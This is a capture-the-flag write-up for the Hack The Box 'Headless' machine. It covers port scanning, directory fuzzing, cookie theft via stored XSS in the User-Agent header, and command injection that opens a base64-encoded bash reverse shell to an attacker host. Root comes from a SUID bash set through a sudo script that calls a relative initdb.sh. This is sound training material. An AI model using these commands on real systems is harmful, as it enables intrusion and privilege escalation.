![Headless](https://github.com/amalcew/htb-writeups/assets/73908014/9951c127-994a-4993-b32a-76f17c72ea1e)

## Reconnaissance & port scanning

Let's start testing the box with standard port scan:

```bash
# Nmap 7.94SVN scan initiated Fri Apr 12 16:49:35 2024 as: nmap -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.8
Nmap scan report for headless.htb (10.10.11.8)
Host is up, received conn-refused (0.025s latency).
Scanned at 2024-04-12 16:49:35 CEST for 97s
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=
5000/tcp open  upnp?   syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK

      ... SNIP ...
```

Interestingly, there is no open port 80, but there is enigmatic `5000 upnp` port open which returns a HTTP fingerprint. Looks like the box uses uncommon port for some website, let's check this.
After adding the IP to the `/etc/hosts/`, I've checked the discovered port:

![01-initial_webpage](https://github.com/amalcew/htb-writeups/assets/73908014/f1a1624b-cff8-413b-afee-115ae4ab2b8e)

Yup, that's a website! Let's continue the enumeration process with fuzzing the directories:

```bash
> ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://headless.htb:5000/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://headless.htb:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 117ms]
dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 77ms]
                        [Status: 200, Size: 2799, Words: 963, Lines: 96, Duration: 155ms]
:: Progress: [87664/87664] :: Job [1/1] :: 441 req/sec :: Duration: [0:06:20] :: Errors: 0 ::

```

`ffuf` discovered two pages, `dashboard` and `support`. The first page is restricted and returns `401` error 

![image](https://github.com/amalcew/htb-writeups/assets/73908014/02df8610-83d2-40f9-a072-063fd1320891)


But the second one looks like a next step in this puzzle, as the page displays contact form.

![02-contact](https://github.com/amalcew/htb-writeups/assets/73908014/428190e3-6d4a-4878-a70c-27e27f7f9d74)

After submiting a form, the website redirects to the same form with no information if the message was delivered. What is interesting, when submitting message `{{ 4 * 4 }}` (to check if there is some SSTI or similar), the website returns this page:

![03-hacking_detected](https://github.com/amalcew/htb-writeups/assets/73908014/fae73d7f-008a-4c7c-b6e2-22ed564ed6d0)

This means that the website is indeed processing the message and that is a good sign. The other thing that I've noticed is the presence of `is_admin` cookie that does not look like it is changing, every time I make a request, the cookie is still the same:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/922916d9-ac2c-4048-b16e-162a2832227e)

This subtle nudge gives a hint, that the way to penetrate the website will require stealing the administrator's cookie, someway. Looking again at the 'Hacking detected' page, we can see that the incident has beem sent to the administrator for investigation

![image](https://github.com/amalcew/htb-writeups/assets/73908014/27e0f744-2634-4648-9f40-d0b51bb59db0)

## Initial foothold

### XSS cookie exfiltration

In theory, if the server recognizes the malicious input inside 'message' field, it means that it can be vulnerable to XSS attacks. There is a way to steal the cookies using XSS attack on the website, documented in [this post](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e) and on [Portswigger's Academy](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies).

The way it is done is relatively simple. Threat actor needs to send a malicious content to the server which will be triggered when someone displays a page that contains it. This type of attack is called **stored XSS**, as the payload lays on the server and is activated by the victim.
After many attempts I've managed to intercept the cookie encoded in base64, by using some techniques from Portswigger's Lab and from the post:

![04-exfiltrated_cookie_1](https://github.com/amalcew/htb-writeups/assets/73908014/ce1ed470-814f-40fd-9405-11098e14aeee)

The probable reason why the payload was required to be sent inside `User-Agent` field is the fact, that the `Hacking detected` page contains this field as one of the evidences, but not `message` content. That's why no attempt with stealing the cookie by using the `message` field was successful.

The output now needs to be decoded from base64 and inserted into the cookie value:

```bash
> echo **** | base64 -d
is_admin; is_admin=ImFk**********************XpH0 
```

![05-dashboard](https://github.com/amalcew/htb-writeups/assets/73908014/ef08bc73-4754-4860-9666-f92b96e5cbad)

Nice! The dashboard allows to pass a date that is used to generate a dummy report. 

### Command injection

It took me a while to leverage this field using Burp Suite, but after some tinkering I've found out, that this field is vulnerable to command injection:

![06-command_injection](https://github.com/amalcew/htb-writeups/assets/73908014/c6a58aee-2fed-4c4a-8705-d30695f31bfb)

As we know the vulnerability, the next step is to gain access to the `dvir` user by spawning reverse shell. To do this we can use simple `bash` shell, encoded as base64:

```bash
> echo 'bash -i >& /dev/tcp/xx.xx.xx.xx/1234 0>&1' | base64 -w 0
YmFz****************************************************Cg==
```

and passed in Burp as payload, with some URL encoding of the key characters:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/b3e95b10-26b1-4c0d-97b5-4d7a9c06717a)

```bash
> nc -lnvp 1234                                                  
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.8] 51764
bash: cannot set terminal process group (1371): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ id
id
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
```

This was sufficient to read the user flag:

```bash
bash-5.2$ cat user.txt  
cat user.txt
c0****************************22
```

## Root privileges escalation

Next step is to discover potential ways to escalate privileges. Simple check on sudo permissions was sufficient:

```bash
bash-5.2$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

As I found out, the `syscheck` script is trying to call some database initialization script that cannot be found on the box:

```bash
bash-5.2$ cat /usr/bin/syscheck
#!/bin/bash

... SNIP ...

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

As the script runs with sudo privileges, we can create the `initdb.sh` script and insert a content that would give us an access to elevated shell, like:

```bash
bash-5.2$ echo 'chmod u+s /bin/bash' > initdb.sh
bash-5.2$ chmod +x initdb.sh 
```

And execute the `syscheck` with sudo:

```bash
bash-5.2$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.03, 0.03, 0.00
Database service is not running. Starting it...
bash-5.2$ /bin/bash -p
bash-5.2# id
uid=1000(dvir) gid=1000(dvir) euid=0(root) groups=1000(dvir),100(users)
```

This way we can access the root flag:

```bash
bash-5.2# cat /root/root.txt
1e0d************************0238
```
